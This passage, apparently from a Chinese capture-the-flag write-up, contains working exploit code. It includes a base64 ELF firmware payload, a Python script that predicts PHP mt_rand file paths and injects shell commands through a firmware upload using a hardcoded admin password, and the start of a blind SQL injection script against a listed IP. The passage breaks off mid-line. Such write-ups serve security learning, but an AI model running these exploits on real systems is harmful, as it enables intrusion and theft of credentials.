AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAByAAAAAAAAAGFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWEAAAAAARsDOyAAAAADAAAAFO///zwAAABk7///ZAAAACnw//98AAAAFAAAAAAAAAABelIAAXgQARsMBwiQAQAAJAAAABwAAADQ7v//UAAAAAAOEEYOGEoPC3cIgAA/GjsqMyQiAAAAABQAAABEAAAA+O7//wgAAAAAAAAAAAAAABwAAABcAAAApe///3YAAAAAQQ4QhgJDDQYCcQwHCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADARAAAAAAAAAAAAAAAAAADwEAAAAAAAAAEAAAAAAAAAfAAAAAAAAAAMAAAAAAAAAAAQAAAAAAAADQAAAAAAAACsEQAAAAAAABkAAAAAAAAAAD4AAAAAAAAbAAAAAAAAABAAAAAAAAAAGgAAAAAAAAAQPgAAAAAAABwAAAAAAAAACAAAAAAAAAD1/v9vAAAAAGACAAAAAAAABQAAAAAAAACwAwAAAAAAAAYAAAAAAAAAkAIAAAAAAAAKAAAAAAAAAJIAAAAAAAAACwAAAAAAAAAYAAAAAAAAAAMAAAAAAAAAAEAAAAAAAAACAAAAAAAAAGAAAAAAAAAAFAAAAAAAAAAHAAAAAAAAABcAAAAAAAAAcAUAAAAAAAAHAAAAAAAAAIAEAAAAAAAACAAAAAAAAADwAAAAAAAAAAkAAAAAAAAAGAAAAAAAAAD+//9vAAAAAGAEAAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAQgQAAAAAAAD5//9vAAAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGD4AAAAAAAAAAAAAAAAAAAAAAAAAAAAANhAAAAAAAABGEAAAAAAAAFYQAAAAAAAAZhAAAAAAAAA4QAAAAAAAAAAAAAAAAAAAR0NDOiAoRGViaWFuIDguMy4wLTYpIDguMy4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCAAAAAAAAAAAAAAAAAAAAAAAAAwACAGACAAAAAAAAAAAAAAAAAAAAAAAAAwADAJACAAAAAAAAAAAAAAAAAAAAAAAAAwAEALADAAAAAAAAAAAAAAAAAAAAAAAAAwAFAEIEAAAAAAAAAAAAAAAAAAAAAAAAAwAGAGAEAAAAAAAAAAAAAAAAAAAAAAAAAwAHAIAEAAAAAAAAAAAAAAAAAAAAAAAAAwAIAHAFAAAAAAAAAAAAAAAAAAAAAAAAAwAJAAAQAAAAAAAAAAAAAAAAAAAAAAAAAwAKACAQAAAAAAAAAAAAAAAAAAAAAAAAAwALAHAQAAAAAAAAAAAAAAAAAAAAAAAAAwAMAIAQAAAAAAAAAAAAAAAAAAAAAAAAAwANAKwRAAAAAAAAAAAAAAAAAAAAAAAAAwAOAAAgAAAAAAAAAAAAAAAAAAAAAAAAAwAPAAwhAAAAAAAAAAAAAAAAAAAAAAAAAwAQADAhAAAAAAAAAAAAAAAAAAAAAAAAAwARAAA+AAAAAAAAAAAAAAAAAAAAAAAAAwASABA+AAAAAAAAAAAAAAAAAAAAAAAAAwATABg+AAAAAAAAAAAAAAAAAAAAAAAAAwAUANg/AAAAAAAAAAAAAAAAAAAAAAAAAwAVAABAAAAAAAAAAAAAAAAAAAAAAAAAAwAWADhAAAAAAAAAAAAAAAAAAAAAAAAAAwAXAGBAAAAAAAAAAAAAAAAAAAAAAAAAAwAYAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAgAMAIAQAAAAAAAAAAAAAAAAAAAOAAAAAgAMALAQAAAAAAAAAAAAAAAAAAAhAAAAAgAMAPAQAAAAAAAAAAAAAAAAAAA3AAAAAQAXAGBAAAAAAAAAAQAAAAAAAABGAAAAAQASABA+AAAAAAAAAAAAAAAAAABtAAAAAgAMADARAAAAAAAAAAAAAAAAAAB5AAAAAQARAAA+AAAAAAAAAAAAAAAAAACYAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACjAAAAAQAQAKghAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAACxAAAAAgANAKwRAAAAAAAAAAAAAAAAAAC3AAAAAQAWADhAAAAAAAAAAAAAAAAAAADEAAAAAQATABg+AAAAAAAAAAAAAAAAAADNAAAAAAAPAAwhAAAAAAAAAAAAAAAAAADgAAAAAQAWAEhAAAAAAAAAAAAAAAAAAADsAAAAAQAVAABAAAAAAAAAAAAAAAAAAAACAQAAAgAJAAAQAAAAAAAAAAAAAAAAAAAIAQAAIAAAAAAAAAAAAAAAAAAAAAAAAAAkAQAAEgAAAAAAAAAAAAAAAAAAAAAAAAA3AQAAEgAMADURAAAAAAAAdgAAAAAAAAA7AQAAEgAAAAAAAAAAAAAAAAAAAAAAAABPAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABjAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACGAQAAEQAWAEBAAAAAAAAACAAAAAAAAAByAQAAEgAAAAAAAAAAAAAAAAAAAAAAAACFAQAAEQAXAIBAAAAAAAAAMAEAAAAAAACOAQAAIAAAAAAAAAAAAAAAAAAAAAAAAACoAQAAIgAAAAAAAAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjczMjUAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGZpcm13YXJlLmMAX19GUkFNRV9FTkRfXwBfZmluaQBfX2Rzb19oYW5kbGUAX0RZTkFNSUMAX19HTlVfRUhfRlJBTUVfSERSAF9fVE1DX0VORF9fAF9HTE9CQUxfT0ZGU0VUX1RBQkxFXwBfaW5pdABfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAZnJlYWRAQEdMSUJDXzIuMi41AGZ1bgBwY2xvc2VAQEdMSUJDXzIuMi41AG1lbXNldEBAR0xJQkNfMi4yLjUAX19nbW9uX3N0YXJ0X18AcG9wZW5AQEdMSUJDXzIuMi41AF92ZXJzaW9uAF9JVE1fcmVnaXN0ZXJUTUNsb25lVGFibGUAX19jeGFfZmluYWxpemVAQEdMSUJDXzIuMi41AAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5wbHQuZ290AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmR5bmFtaWMALmdvdC5wbHQALmRhdGEALmJzcwAuY29tbWVudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGwAAAAcAAAACAAAAAAAAADgCAAAAAAAAOAIAAAAAAAAkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC4AAAD2//9vAgAAAAAAAABgAgAAAAAAAGACAAAAAAAAMAAAAAAAAAADAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAA4AAAACwAAAAIAAAAAAAAAkAIAAAAAAACQAgAAAAAAACABAAAAAAAABAAAAAEAAAAIAAAAAAAAABgAAAAAAAAAQAAAAAMAAAACAAAAAAAAALADAAAAAAAAsAMAAAAAAACSAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAEgAAAD///9vAgAAAAAAAABCBAAAAAAAAEIEAAAAAAAAGAAAAAAAAAADAAAAAAAAAAIAAAAAAAAAAgAAAAAAAABVAAAA/v//bwIAAAAAAAAAYAQAAAAAAABgBAAAAAAAACAAAAAAAAAABAAAAAEAAAAIAAAAAAAAAAAAAAAAAAAAZAAAAAQAAAACAAAAAAAAAIAEAAAAAAAAgAQAAAAAAADwAAAAAAAAAAMAAAAAAAAACAAAAAAAAAAYAAAAAAAAAG4AAAAEAAAAQgAAAAAAAABwBQAAAAAAAHAFAAAAAAAAYAAAAAAAAAADAAAAFQAAAAgAAAAAAAAAGAAAAAAAAAB4AAAAAQAAAAYAAAAAAAAAABAAAAAAAAAAEAAAAAAAABcAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAcwAAAAEAAAAGAAAAAAAAACAQAAAAAAAAIBAAAAAAAABQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAAH4AAAABAAAABgAAAAAAAABwEAAAAAAAAHAQAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAACHAAAAAQAAAAYAAAAAAAAAgBAAAAAAAACAEAAAAAAAACsBAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAjQAAAAEAAAAGAAAAAAAAAKwRAAAAAAAArBEAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAJMAAAABAAAAAgAAAAAAAAAAIAAAAAAAAAAgAAAAAAAACQEAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACbAAAAAQAAAAIAAAAAAAAADCEAAAAAAAAMIQAAAAAAACQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAqQAAAAEAAAACAAAAAAAAADAhAAAAAAAAMCEAAAAAAAB8AAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAALMAAAAOAAAAAwAAAAAAAAAAPgAAAAAAAAAuAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAC/AAAADwAAAAMAAAAAAAAAED4AAAAAAAAQLgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAywAAAAYAAAADAAAAAAAAABg+AAAAAAAAGC4AAAAAAADAAQAAAAAAAAQAAAAAAAAACAAAAAAAAAAQAAAAAAAAAIIAAAABAAAAAwAAAAAAAADYPwAAAAAAANgvAAAAAAAAKAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAADUAAAAAQAAAAMAAAAAAAAAAEAAAAAAAAAAMAAAAAAAADgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA3QAAAAEAAAADAAAAAAAAADhAAAAAAAAAODAAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOMAAAAIAAAAAwAAAAAAAABgQAAAAAAAAEgwAAAAAAAAUAEAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAADoAAAAAQAAADAAAAAAAAAAAAAAAAAAAABIMAAAAAAAABwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAaDAAAAAAAAAoBQAAAAAAABoAAAAsAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAJA1AAAAAAAAxAEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAABUNwAAAAAAAPEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA')class php_rand(): MT_RAND_MT19937 = 0 MT_RAND_PHP = 1 php_N = 624 php_M = 397 php_left = 0 php_next = 0 php_state = [0] * (php_N + 1) php_mode = 0 def __init__(self, seed, mode=0): self.php_mt_srand(seed) self.php_mode = mode def seed(self, seed): self.php_mt_srand(seed) def rand(self): return self.php_mt_rand() def hiBit(self, u): return u &amp; 0x80000000 def loBit(self, u): return u &amp; 0x00000001 def loBits(self, u): return u &amp; 0x7FFFFFFF def mixBits(self, u, v): return self.hiBit(u) | self.loBits(v) def twist(self, m, u, v): return m ^ (self.mixBits(u, v) &gt;&gt; 1) ^ ((-self.loBit(v)) &amp; 0x9908b0df) def twist_php(self, m, u, v): return m ^ (self.mixBits(u, v) &gt;&gt; 1) ^ ((-self.loBit(u)) &amp; 0x9908b0df) def php_mt_initialize(self, seed): state = self.php_state N = self.php_N state[0] = seed &amp; 0xffffffff for i in range(1, N): state[i] = (1812433253 * (state[i - 1] ^ (state[i - 1] &gt;&gt; 30)) + i) &amp; 0xffffffff self.php_state = state def php_mt_reload(self): self.php_left = 0 state = self.php_state N = self.php_N M = self.php_M p = 0 i = N - M if self.php_mode == self.MT_RAND_MT19937: while i &gt; 0: i -= 1 state[p] = self.twist(state[p + M],state[p + 0],state[p + 1]) p += 1 i = M - 1 while i &gt; 0: state[p] = self.twist(state[p+M-N],state[p + 0],state[p + 1]) p += 1 i -= 1 state[p] = self.twist(state[p + M - N],state[p + 0],state[0]) else: while i &gt; 0: i -= 1 state[p] = self.twist_php(state[p + M],state[p + 0],state[p + 1]) p += 1 i = M - 1 while i &gt; 0: state[p] = self.twist_php(state[p + M - N],state[p + 0],state[p + 1]) p += 1 i -= 1 state[p] = self.twist_php(state[p + M - N],state[p + 0],state[0]) self.php_left = N self.php_next = 0 self.php_state = state def php_mt_srand(self, seed): self.php_mt_initialize(seed) self.php_mt_reload() def php_mt_rand(self): if self.php_left == 0: self.php_mt_reload() self.php_left -= 1 s1 = self.php_state[self.php_next] s1 ^= (s1 &gt;&gt; 11) s1 ^= (s1 &lt;&lt; 7) &amp; 0x9d2c5680 s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000 self.php_next += 1 return ( s1 ^ (s1 &gt;&gt; 18)) &gt;&gt; 1# get random stringdef rand_str(length=8): return ''.join(random.sample(string.ascii_letters + string.digits, length))# get methoddef get(session, url): retry = 0 while True: retry += 1 try: if session: r = s.get(url, timeout=timeout) else: r = requests.get(url, timeout=timeout) except: if retry &gt;= retry_count: print('timeout or http 500') exit() continue break return r# post methoddef post(session, url, data, files=''): retry = 0 while True: retry += 1 try: if session: if files=='': r = s.post(url, data=data, timeout=timeout) else: r = s.post(url, data=data, files=files, timeout=timeout) else: if files=='': r = requests.post(url, data=data, timeout=timeout) else: r = requests.post(url, data=data, files=files, timeout=timeout) except: if retry &gt;= retry_count: print('timeout or http 500') exit() continue break return r# login with username and passworddef login(username, password): url = site_url + '/hotload.php?page=login' data = &#123;'username': username, 'password': password&#125; if logging: print(url) if logging: print(data) res = post(1, url, data) if logging: print(res.text) url = site_url + '/hotload.php?page=upload' res = get(1, url) if 'fileuploaded' not in res.text: return False return True# reg with username and passworddef reg(username, password): url = site_url + '/hotload.php?page=reg' if logging: print(url) res = get(1, url) show_code = '' show_calc = '' try: show_code = res.text.split('show_code"&gt;')[1].split('&lt;')[0] show_calc = res.text.split('show_calc"&gt;')[1].split('&lt;')[0] if logging: print(len(show_calc)) if len(show_calc) != 6: print('invalid show_calc length') return False except: return False if logging: print("show_code",show_code) if logging: print("show_calc",show_calc) code = '' for i in range(1, 100000000): code = str(i) if hashlib.md5(code + show_code).hexdigest()[:6] == show_calc.lower(): break data = &#123;'username': username, 'password1': password, 'password2': password, 'code': code&#125; if logging: print(data) res = post(1, url, data) if logging: print(res.text) if '"status":1' in res.text: return True return False# upload music [diff]def upload_music(): url = site_url + '/hotload.php?page=upload' data = &#123;'file_id': '0'&#125; music = preset_music[:0x6] + '\x00\x00\x03\x00' + preset_music[0x0a:0x53] music += '\x00\x00\x03\x00' + '\x00\x00\x03' + 'a' * 0x70 + '\x00' files = &#123;'file_data': music&#125; if logging: print(url) if logging: print(data) res = post(1, url, data, files) if logging: print(res.text) if '"status":1' in res.text: try: # n54LuyJyYLVpVO2w return b64decode(json.loads(res.content.strip())['artist'])[:16] except: return '' return ''# upload firmware [diff]def upload_firmware(command): if len(command) &gt; 0x100: return -1 url = site_url + '/hotload.php?page=firmware' data = &#123;'file_id': '0'&#125; command = command.ljust(0x100, '\x00') firmware = preset_firmare.replace('a' * 0x100, command) files = &#123;'file_data': firmware&#125; if logging: print(url) if logging: print(data) res = post(1, url, data, files) if logging: print("Upload: " + res.text) if '"status":1' in res.text: if 'Date' in res.headers.keys(): print("Date Header: " + res.headers['Date']) return int(datetime.strptime(res.headers['Date'], "%a, %d %b %Y %X %Z").strftime("%s")) + time_zone_offset else: return int(time.time()) return -1# get firmware versiondef firmware_version(path): if len(path)&gt;0x40: return '' url = site_url + '/hotload.php?page=firmware' data = &#123;'path': path&#125; if logging: print(url) if logging: print(data) res = post(1, url, data) if logging: print(res.text) if '"status":1' in res.text: try: return json.loads(res.content.strip())['info'] except: return '' return ''# show resultdef show_result(vuln1, vuln2, msg): result = '' if vuln1 == -1: result += 'Vuln 1 check: unknown.\n' elif vuln1 == 0: result += 'Vuln 1 check: fail.\n' else: result += 'Vuln 1 check: pass.\n' if vuln2 == -1: result += 'Vuln 2 check: unknown.\n' elif vuln2 == 0: result += 'Vuln 2 check: fail.\n' else: result += 'Vuln 2 check: pass.\n' result += msg print(result) exit()# get flagdef get_flag(): path = 0 vuln1 = -1 vuln2 = -1 logined = -1 if path == 0: # username = '1Bq2DT3j' # password = 'KWRpkXgHnb' # # res = reg(username, password) # # if not res: show_result(vuln1, vuln2, 'register fail') # res = login(username, password) # if not res: show_result(vuln1, vuln2, 'login fail') # time.sleep(3) # res = upload_music() # if res == '': # vuln1 = 0 # show_result(vuln1, vuln2, 'leak admin password fail') admin_password = 'Mike84eiNxHcMVCz' global s s = requests.session() res = login('admin', admin_password) if not res: vuln1 = 0 show_result(vuln1, vuln2, 'leak wrong admin password') vuln1 = 1 time.sleep(3) guess_server_time = upload_firmware(command) print(guess_server_time) if guess_server_time == -1: show_result(vuln1, vuln2, 'upload fail') vuln2 = 0 succ_keyword = '固件版本号：' if vuln2 == 0: for i in range(5): rander = php_rand(guess_server_time - i) # path = hashlib.md5(str(rander.rand()) + '182.91.145.76').hexdigest() path = hashlib.md5(str(rander.rand()) + '39.108.249.224').hexdigest() try: prev_flag = firmware_version(path).encode('utf-8') except: continue if succ_keyword in prev_flag: vuln2 = 1 prev_flag = prev_flag.replace(succ_keyword, '').strip() break show_result(vuln1, vuln2, prev_flag)if __name__ == '__main__': if len(argv) != 3: print("wrong params.") print("example: python %s %s %s" % (argv[0], '127.0.0.1', '80')) exit() ip = argv[1] port = int(argv[2]) site_url = 'http://%s:%d' % (ip, port) get_flag() PS: 注意时区问题 0x04 giftbox题目描述送给小蛮腰的礼物，她是一位美丽的姑娘。 A gift for Canton Tower, a pretty girl. 题目解答PS: 这个樱花真好看，上去就先保存了，哈哈 看1view-source:http://222.85.25.41:8090/js/ 知道pyotp.zip和&gt;totp.min.js是采用了双因子认证 得到关于双因子认证的信息 1view-source:http://222.85.25.41:8090/js/main.js login处登录注入得到账号密码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!/usr/bin/env python3# -*- coding: utf-8 -*-import requestsimport pyotp as pyotptotp = pyotp.TOTP('GAXG24JTMZXGKZBU', 8, interval=5)def main(): get_data()def http_get(payload): r = requests.post('http://222.85.25.41:8090/shell.php', params=&#123;'a': 'login admin\'/**/and/**/(' + payload + ')/**/and/**/\'1\'=\'1 admin', 'totp': totp.now()&#125;, data=&#123;'dir': '/', 'pos': '/', 'filename': 'usage.md'&#125;) # print('login admin\'/**/and/**/(' + payload + ')/**/and/**/\'1\'=\'1 admin') # print(r.text) if 'password' in r.text: return True else: return Falsedef get_data(): # db_nums_payload = "select/**/count(*)/**/from/**/user" # db_numbers = half(db_nums_payload) # print("长度为：%d" % db_numbers) # db_data = "select/**/version()" # db_data = "select/**/database()" for i in range(0, 2): # db_data = "SELECT/**/table_name/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=\'giftbox\'/**/LIMIT/**/&#123;&#125;,1".format( # i) # db_data = "SELECT/**/column_name/**/FROM/**/information_schema.columns/**/WHERE/**/table_schema=\'giftbox\'/**/and/**/table_name=\'users\'/**/LIMIT/**/&#123;&#125;,1".format( # i) db_data = "select/**/password/**/from/**/giftbox.users/**/limit/**/&#123;&#125;,1".format( i) db_name = "" for y in range(1, 64): db_name_payload = 